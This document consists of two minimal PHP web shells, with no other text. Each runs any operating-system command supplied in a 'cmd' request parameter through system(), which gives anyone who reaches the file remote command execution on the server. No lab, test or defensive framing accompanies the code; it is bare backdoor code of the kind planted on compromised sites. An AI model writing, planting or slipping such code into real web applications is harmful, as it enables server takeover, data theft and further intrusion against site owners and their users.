<?php echo system($_GET['cmd']); ?>

<?php
if(isset($_REQUEST['cmd'])){
  $cmd = ($_REQUEST['cmd']);
  system($cmd);
}
?>
